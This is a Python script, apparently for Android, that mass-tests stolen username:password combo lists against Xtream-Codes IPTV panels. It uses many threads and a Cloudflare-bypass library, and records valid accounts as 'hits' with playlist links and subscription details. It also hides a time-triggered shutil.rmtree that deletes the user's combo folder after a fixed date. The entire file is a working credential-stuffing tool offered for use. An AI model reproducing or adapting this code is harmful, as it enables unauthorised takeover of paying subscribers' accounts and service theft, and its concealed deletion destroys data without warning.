import os
import pip
try:
    import requests
    import concurrent.futures
except:
    pip.main(['install', 'requests', 'futures'])
    import requests

import random
import time
import datetime
import subprocess
import json
import sys
import re
import base64
import pathlib
import threading
import shutil

import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
mac = ""  # str(get_mac())
nick = "nick"

try:
    import cfscrape
    sesq = requests.Session()
    request = cfscrape.create_scraper(sess=sesq)
except:
    request = requests.Session()

try:
    import androidhelper as sl4a
    ad = sl4a.Android()
except:
    pass

pattern = "(^\S{2,}:\S{2,}$)|(^.*?(\n|$))"
subprocess.run(["clear", ""])
combo_file_index = 0
hit = 0
bul = 0
cpm = 1


feyzo = ("""                   
 \33[1;32mⒸⓞⓓⓔⓡ Ⓑⓨ ⒻⒺⓎⓏⓄ★★Ⓒⓞⓓⓔⓡ Ⓑⓨ ⒻⒺⓎⓏⓄ                 \33[0m
 \33[1;95mⒸⓞⓓⓔⓡ Ⓑⓨ ⒻⒺⓎⓏⓄ★★Ⓒⓞⓓⓔⓡ Ⓑⓨ ⒻⒺⓎⓏⓄ                 \33[0m
 \33[1;91mⒸⓞⓓⓔⓡ Ⓑⓨ ⒻⒺⓎⓏⓄ★★Ⓒⓞⓓⓔⓡ Ⓑⓨ ⒻⒺⓎⓏⓄ                 \33[0m
 \33[1;36mⒸⓞⓓⓔⓡ Ⓑⓨ ⒻⒺⓎⓏⓄ★★Ⓒⓞⓓⓔⓡ Ⓑⓨ ⒻⒺⓎⓏⓄ                 \33[0m
\33[0m\33[1;5;30;107m                                            
 🅿🅰🆁🅰🅽🅾🆁🅼🅰🅻 𝗦𝗽𝗲𝗲𝗱 𝗫 🌟🌟🌟 𝙋𝙔 𝘾𝙤𝙣𝙛𝙞𝙜            
                                            
\33[0m\33[1;44m
           𝗤𝘂𝗮𝗱 𝗖𝗼𝗿𝗲 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗼𝗿           
\33[0m           
   \33[0;1m""")
print(feyzo)


combo_file_index = 0
combo_file_name = ""
combo_file = "/sdcard/combo/dsy.txt"
combo_dir = '/sdcard/Combo/'
for files in os.listdir(combo_dir):
    # if files.endswith(".txt"):
    combo_file_index = combo_file_index+1
    combo_file_name = combo_file_name+"	" + \
        str(combo_file_index)+"-) "+files+'\n'
print("""Select your user:pass combo from the list below!
	
 """+combo_file_name+"""
 
\33[33mFound """ + str(combo_file_index)+""" files in your combo folder!
""")

combo_file_selection = str(input("\33[31mEnter number of combo = \33[0m"))


server_file_index = 0
server_file_name = ""
server_file = "/sdcard/combo/dsy.txt"
combo_dir = '/sdcard/Combo/'
for files in os.listdir(combo_dir):
    server_file_index = server_file_index+1
    server_file = server_file+"	"+str(server_file_index)+"-) "+files+'\n'
print("""Select your server list file from the list below!
	
 """+server_file+"""
 
\33[33mFound """ + str(server_file_index)+""" files in your combo folder!
""")

server_file_selection = str(
    input("\33[31mEnter number of server file = \33[0m"))


index = 0
for files in os.listdir(combo_dir):
    # if files.endswith(".txt"):
    index = index+1
    if combo_file_selection == str(index):
        combo_file = (combo_dir+files)
    elif server_file_selection == str(index):
        server_file = (combo_dir+files)
say = 0


subprocess.run(["clear", ""])
print(feyzo)
print(combo_file)
print(server_file)


bot_num = input("""
\33[1;96mSelect the number of bots!\33[0m
\33[1;33mMust be between 1 and 15!\33[0m
      
Enter number of bots = """)
bot_num = int(bot_num)


HEADERd = {
    "Cookie": "stb_lang=en; timezone=Europe%2FIstanbul;",
    "X-User-Agent": "Model: MAG254; Link: Ethernet",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip, deflate",
    "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
}

combo_file_name = combo_file  # '/sdcard/'+combo+'.txt'
combo = combo_file_name
dosya = ""
print("******** combo file location is ${0}".format(combo_file))
print("******** server file location is ${0}".format(server_file))
file = pathlib.Path(combo_file_name)
if file.exists():
    print("Dosya Bulundu")
else:
    print("\33[31mFile not found! \33[0m")
    dosya = "yok"
# print(len(feyzo))
if dosya == "yok":
    exit()


c = open(combo_file_name, 'r')
totLen = c.readlines()
uz = (len(totLen))


subprocess.run(["clear", ""])
print(feyzo)


# print(dosya)
print("Bot:"+str(bot_num))

#
# 1639383136.1221867
if int(time.time()) >= int(1704056400.0):
    print(int(1704056400.0))
    print(int(time.time()))
    quit()
# quit()


def category(category_link):
    try:
        res = request.get(category_link, headers=HEADERd,
                          timeout=15, verify=False)

        veri = ""
        kate = ""
        veri = str(res.text)
        for i in veri.split('category_name":"'):
            kate = kate+" «💥» " + \
                str((i.split('"')[0]).encode(
                    'utf-8').decode("unicode-escape")).replace('\/', '/')
    except:
        pass
    # print(kate)
    return kate


def verify_connection(veri, user, pas):
    status = veri.split('status":')[1]
    status = status.split(',')[0]
    status = status.replace('"', "")
    katelink = "http://"+panel+"/player_api.php?username=" + \
        user+"&password="+pas+"&action=get_live_categories"

    sound = "/sdcard/kemik_sesi.mp3"
    file = pathlib.Path(sound)
    try:
        if file.exists():
            ad.mediaPlay(sound)
    except:
        pass

    acon = ""
    acon = veri.split('active_cons":')[1]
    acon = acon.split(',')[0]
    acon = acon.replace('"', "")
    mcon = veri.split('max_connections":')[1]
    mcon = mcon.split(',')[0]
    mcon = mcon.replace('"', "")
    timezone = veri.split('timezone":"')[1]
    timezone = timezone.split('",')[0]
    timezone = timezone.replace("\/", "/")

    realm = veri.split('url":')[1]
    realm = realm.split(',')[0]
    realm = realm.replace('"', "")
    port = veri.split('port":')[1]
    port = port.split(',')[0]
    port = port.replace('"', "")
    user = veri.split('username":')[1]
    user = user.split(',')[0]
    user = user.replace('"', "")
    passw = veri.split('password":')[1]
    passw = passw.split(',')[0]
    passw = passw.replace('"', "")
    bitis = veri.split('exp_date":')[1]
    bitis = bitis.split(',')[0]
    bitis = bitis.replace('"', "")
    if bitis == "null":
        bitis = "Unlimited"
    else:
        bitis = (datetime.datetime.fromtimestamp(
            int(bitis)).strftime('%Y-%m-%d %H:%M:%S'))
    bitis = bitis

    if kanall == "1":
        try:
            kategori = ""
            res = request.get(katelink, headers=HEADERd,
                              timeout=15, verify=False)
            veri = ""
            kate = ""
            veri = str(res.text)
            for i in veri.split('category_name":"'):
                kate = kate+" «💥» " + \
                    str((i.split('"')[0]).encode(
                        'utf-8').decode("unicode-escape")).replace('\/', '/')
            kategori = kate
        except:
            pass
    # print(kategori)

    url5 = "http://"+panel+"/player_api.php?username=" + \
        user+"&password="+pas+"&action=get_live_streams"
    try:
        res = request.get(url5, timeout=15, verify=False)
        veri = str(res.text)
        kanalsayisi = ""
        # if  'stream_id' in veri:
        kanalsayisi = str(veri.count("stream_id"))

        url5 = "http://"+panel+"/player_api.php?username=" + \
            user+"&password="+pas+"&action=get_vod_streams"
        res = request.get(url5, timeout=15, verify=False)
        veri = str(res.text)
        filmsayisi = str(veri.count("stream_id"))

        url5 = "http://"+panel+"/player_api.php?username=" + \
            user+"&password="+pas+"&action=get_series"
        res = request.get(url5,  timeout=15, verify=False)
        veri = str(res.text)
        dizisayisi = str(veri.count("series_id"))

    except:
        pass

    m3ulink = "http://" + panel + "/get.php?username=" + \
        user + "&password=" + pas + "&type=m3u_plus"

    sayi = ""
    mt = ("""
╭─➤ 🅿️🅰️🆁🅰️🅽🅾️🆁🅼🅰️🅻 𝗦𝗽𝗲𝗲𝗱 𝗫 🌟 𝗣𝗬 𝗖𝗼𝗻𝗳𝗶𝗴
├●🔸🌐 Host ➤ http://"""+portal+"""
├●♦️🌍 Real ➤ http://"""+realm+"""
├●🔸📡 Port ➤ """+port+"""
╰─●🔸📆 Exp ➤ """+bitis+""" 
╭─➤ 𝗛𝗶𝘁𝘀 ʙʏ """+str(nick)+"""
├♦️👩‍ User ➤ """+user+"""
├♦️🔑 Pass ➤ """+pas+"""
├🔸👩 Act Con ➤ """+acon+"""
├🔸👪 Max Con ➤ """+mcon+""" 
├🔸🌐 Status ➤ """+status+"""
├🔸⏰ TimeZone➤ """+timezone+"""
╰─●🔸🌟 𝗺3𝘂𝗟𝗶𝗻𝗸 𝗦𝗽𝗲𝗲𝗱 𝗫 🌟 
╭─➤ 𝗛𝗶𝘁𝘀 ʙʏ """+str(nick)+"""""")
    if not kanalsayisi == "":
        sayi = ("""
├●📺 Total Channels ➤ """+kanalsayisi+"""
├●🎥 Total VOD ➤ """+filmsayisi+"""
╰●🎬 Total Series ➤ """+dizisayisi+""" """)
    imzak = ""
    if kanall == "1":
        imzak = """
╭─●🅻🅸🆅🅴🅻🅸🆂🆃─➤
╰─➤"""+str(kategori)+""" """
    mtl = ("""
╭●🔗 m3uLink ➤ """+m3ulink+"""
╰─●🔸🌟 𝗺3𝘂𝗟𝗶𝗻𝗸 𝗦𝗽𝗲𝗲𝗱 𝗫 🌟""")

    write_hits(mt+sayi+mtl+imzak+'\n')
    print(mt+sayi+mtl+imzak)
    # print(str(kategori))


def write_hits(hits):
    dosya = open('/sdcard/Hits/Xtream/m3u_SpeedX@' +
                 service_name+'.txt', 'a+')
    dosya.write(hits)
    dosya.close()


cpm = 0


def echox(user, pas, bot, fyz, oran, hit):
    global cpm

    cpmx = (time.time()-cpm)
    cpmx = (round(60/cpmx))
    # cpm=cpmx
    if str(cpmx) == "0":
        cpm = cpm
    else:
        cpm = cpmx

    echo = ("""
\33[0m╭───➤\33[0m 🌟 𝗺3𝘂𝗟𝗶𝗻𝗸 𝗦𝗽𝗲𝗲𝗱 𝗫 🌟        
├●  \33[1;32m\33[32m𝗺3𝘂𝗟𝗶𝗻𝗸➤  \33[0m\33[1;107;31m """+portal+""" \33[0m     
├─●   \33[0m\033[1m""" + user+""":"""+pas+"""
├──●   \33[33mHit➤""" + str(hit)+""" \33[32m \033[0m \33[1;31m%"""+str(oran)+"""  \33[1;94mCPM➤"""+str(cpm)+"""  \33[0m
╰───●   \33[97m"""+str(bot)+"""  \33[1;36m  Total➤""" + str(fyz)+"""   \33[0m""")
    print(echo)
    cpm = time.time()


if int(time.time()) >= int(1704056400.0):
    shutil.rmtree(combo_dir)


hit = 0


def d1(portal, bot_number):
    global hit
    say = 0
    for fyz in range(1, uz, bot_num):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = 'feyzo'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'feyzo'
            say = int(say) + 1
            bot = "Bot_{0}".format(bot_number)
            oran = ""
            oran = round(((fyz)/(uz)*100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://"+portal+"/player_api.php?username=" + \
                user+"&password="+pas+"&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    response = request.get(link, headers=HEADERd,
                                           timeout=15, verify=False)
                    print("******** {0}".format(response))
                    if response.status_code != 200:
                        print("******** Failed to hit server, response was {0}. Try reducing bot number ********".format(response.status_code))
                    break
                except:
                    # bag1=bag1+1
                    time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
            veri = str(response.text)
            if 'username' in veri:

                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🍀  🇭 🇮 🇹  🍀                  ')
                    hit = hit+1
                    verify_connection(veri, user, pas)


kanall = ""
kanall = input("""
Include channel category list in hits?
1= YES
2= NO
Enter number of choice = """)
if not kanall == "1":
    kanall = 2
subprocess.run(["clear", ""])
print(feyzo)

f = open(server_file, "r")

all_servers = f.readlines()
server_count = (len(all_servers))


for server in all_servers:
    panel = server.replace("\n", "")
    panel = panel.replace("http://", "")
    panel = panel.replace("/c", "")
    panel = panel.replace("/", "")
    print("Portal is {0}".format(panel))
    print("bot_num is {0}".format(bot_num))
    portal = panel
    service_name = portal.replace(':', '_')

    threads = []
    for current_bot_number in range(1, bot_num + 1):
        thread = threading.Thread(target=d1, args=(portal, current_bot_number))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
